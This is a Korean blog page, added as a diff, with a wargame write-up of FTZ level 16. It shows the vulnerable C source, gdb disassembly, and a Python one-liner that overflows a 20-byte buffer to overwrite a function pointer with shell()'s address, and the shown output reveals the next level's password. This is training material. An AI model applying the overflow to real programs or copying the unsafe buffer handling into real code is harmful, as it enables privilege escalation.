@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang=ko>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Level 16Description12345678910111213141516171819#include &lt;stdio.h&gt;void shell() &#123;	setreuid(3097, 3097);	system(&quot;&#x2F;bin&#x2F;sh&quot;);&#125;void printit() &#123;	printf(&quot;Hello there! \n&amp;q">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FTZ : level 16">
+<meta property="og:url" content="https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/index.html">
+<meta property="og:site_name" content="bintab1e">
+<meta property="og:description" content="Level 16Description12345678910111213141516171819#include &lt;stdio.h&gt;void shell() &#123;	setreuid(3097, 3097);	system(&quot;&#x2F;bin&#x2F;sh&quot;);&#125;void printit() &#123;	printf(&quot;Hello there! \n&amp;q">
+<meta property="og:locale" content="ko_KR">
+<meta property="article:published_time" content="2024-09-22T13:12:57.000Z">
+<meta property="article:modified_time" content="2024-10-06T13:42:46.736Z">
+<meta property="article:author" content="bintab1e">
+<meta property="article:tag" content="ftz">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/test.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/test.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/test.png">
+        
+      
+    
+    <!-- title -->
+    <title>FTZ : level 16</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/06/ftz/FTZ-level-17/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/21/ftz/FTZ-level-15/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&text=FTZ : level 16"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&is_video=false&description=FTZ : level 16"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FTZ : level 16&body=Check out this article: https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&name=FTZ : level 16&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&t=FTZ : level 16"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-16"><span class="toc-number">1.</span> <span class="toc-text">Level 16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        FTZ : level 16
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">bintab1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-22T13:12:57.000Z" class="dt-published" itemprop="datePublished">2024-09-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pwnable/">pwnable</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ftz/" rel="tag">ftz</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line">	setreuid(<span class="number">3097</span>, <span class="number">3097</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printit</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello there! \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> crap;</span><br><span class="line">	<span class="type">void</span> (*call) () = printit;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">	fgets(buf, <span class="number">48</span>, <span class="built_in">stdin</span>);</span><br><span class="line">	call();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> crap;</span><br><span class="line">        <span class="type">void</span> (*call) () = printit;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">        fgets(buf, <span class="number">48</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        call();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>20바이트의 버퍼에 fgets 함수로 48만큼 입력받아 bof가 가능하다.<br>이후 printit 함수를 호출한다.<br>printit 함수 주소를 담는 call 함수 포인터에 printit이 아닌 shell 함수의 주소로 덮으면 해결할 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[level16@ftz level16]$ gdb -q attackme</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048518 &lt;main+0&gt;:    push   ebp</span><br><span class="line">0x08048519 &lt;main+1&gt;:    mov    ebp,esp</span><br><span class="line">0x0804851b &lt;main+3&gt;:    sub    esp,0x38</span><br><span class="line">0x0804851e &lt;main+6&gt;:    mov    DWORD PTR [ebp-16],0x8048500</span><br><span class="line">0x08048525 &lt;main+13&gt;:   sub    esp,0x4</span><br><span class="line">0x08048528 &lt;main+16&gt;:   push   ds:0x80496e8</span><br><span class="line">0x0804852e &lt;main+22&gt;:   push   0x30</span><br><span class="line">0x08048530 &lt;main+24&gt;:   lea    eax,[ebp-56]</span><br><span class="line">0x08048533 &lt;main+27&gt;:   push   eax</span><br><span class="line">0x08048534 &lt;main+28&gt;:   call   0x8048384 &lt;fgets&gt;</span><br><span class="line">0x08048539 &lt;main+33&gt;:   add    esp,0x10</span><br><span class="line">0x0804853c &lt;main+36&gt;:   mov    eax,DWORD PTR [ebp-16]</span><br><span class="line">0x0804853f &lt;main+39&gt;:   call   eax</span><br><span class="line">0x08048541 &lt;main+41&gt;:   leave</span><br><span class="line">0x08048542 &lt;main+42&gt;:   ret</span><br><span class="line">0x08048543 &lt;main+43&gt;:   nop</span><br><span class="line">0x08048544 &lt;main+44&gt;:   nop</span><br><span class="line">0x08048545 &lt;main+45&gt;:   nop</span><br><span class="line">0x08048546 &lt;main+46&gt;:   nop</span><br><span class="line">0x08048547 &lt;main+47&gt;:   nop</span><br><span class="line">0x08048548 &lt;main+48&gt;:   nop</span><br><span class="line">0x08048549 &lt;main+49&gt;:   nop</span><br><span class="line">0x0804854a &lt;main+50&gt;:   nop</span><br><span class="line">0x0804854b &lt;main+51&gt;:   nop</span><br><span class="line">0x0804854c &lt;main+52&gt;:   nop</span><br><span class="line">0x0804854d &lt;main+53&gt;:   nop</span><br><span class="line">0x0804854e &lt;main+54&gt;:   nop</span><br><span class="line">0x0804854f &lt;main+55&gt;:   nop</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>gdb를 통해 까 보면, ebp-16 부분에 0x8048500을 담고 있는데 이 부분이 call 함수 포인트로 보인다.<br>또한, ebp-56가 buf인것 같다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas printit</span><br><span class="line">Dump of assembler code for function printit:</span><br><span class="line">0x08048500 &lt;printit+0&gt;: push   ebp</span><br><span class="line">0x08048501 &lt;printit+1&gt;: mov    ebp,esp</span><br><span class="line">0x08048503 &lt;printit+3&gt;: sub    esp,0x8</span><br><span class="line">0x08048506 &lt;printit+6&gt;: sub    esp,0xc</span><br><span class="line">0x08048509 &lt;printit+9&gt;: push   0x80485c0</span><br><span class="line">0x0804850e &lt;printit+14&gt;:        call   0x80483a4 &lt;printf&gt;</span><br><span class="line">0x08048513 &lt;printit+19&gt;:        add    esp,0x10</span><br><span class="line">0x08048516 &lt;printit+22&gt;:        leave</span><br><span class="line">0x08048517 &lt;printit+23&gt;:        ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>printit 함수를 까 보면 더 정확하게 알 수 있는데, printit+0의 주소를 보니 0x8048500인 것을 볼 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas shell</span><br><span class="line">Dump of assembler code for function shell:</span><br><span class="line">0x080484d0 &lt;shell+0&gt;:   push   ebp</span><br><span class="line">0x080484d1 &lt;shell+1&gt;:   mov    ebp,esp</span><br><span class="line">0x080484d3 &lt;shell+3&gt;:   sub    esp,0x8</span><br><span class="line">0x080484d6 &lt;shell+6&gt;:   sub    esp,0x8</span><br><span class="line">0x080484d9 &lt;shell+9&gt;:   push   0xc19</span><br><span class="line">0x080484de &lt;shell+14&gt;:  push   0xc19</span><br><span class="line">0x080484e3 &lt;shell+19&gt;:  call   0x80483b4 &lt;setreuid&gt;</span><br><span class="line">0x080484e8 &lt;shell+24&gt;:  add    esp,0x10</span><br><span class="line">0x080484eb &lt;shell+27&gt;:  sub    esp,0xc</span><br><span class="line">0x080484ee &lt;shell+30&gt;:  push   0x80485b8</span><br><span class="line">0x080484f3 &lt;shell+35&gt;:  call   0x8048364 &lt;system&gt;</span><br><span class="line">0x080484f8 &lt;shell+40&gt;:  add    esp,0x10</span><br><span class="line">0x080484fb &lt;shell+43&gt;:  leave</span><br><span class="line">0x080484fc &lt;shell+44&gt;:  ret</span><br><span class="line">0x080484fd &lt;shell+45&gt;:  lea    esi,[esi]</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>call 함수 포인트에 담기는 주소를 shell로 변경해야 하기 때문에, shell 함수도 까보면, 시작 주소가 0x80484d0인 것을 볼 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[level16@ftz level16]$ (python -c &#x27;print&quot;\x90&quot;*40+&quot;\xd0\x84\x04\x08&quot;&#x27;; cat) | ./attackme</span><br><span class="line">my-pass</span><br><span class="line"></span><br><span class="line">Level17 Password is &quot;king poetic&quot;.</span><br></pre></td></tr></table></figure>
+<p>스택 메모리 구조를 생각해 볼때, ebp-56과 ebp-16이 40만큼 차이나므로, buf에 40만큼 채워 shell의 주소를 삽입해 주면 해결할 수 있다.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-16"><span class="toc-number">1.</span> <span class="toc-text">Level 16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&text=FTZ : level 16"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&is_video=false&description=FTZ : level 16"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FTZ : level 16&body=Check out this article: https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&title=FTZ : level 16"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&name=FTZ : level 16&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bintab1e.github.io/2024/09/22/ftz/FTZ-level-16/&t=FTZ : level 16"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    bintab1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
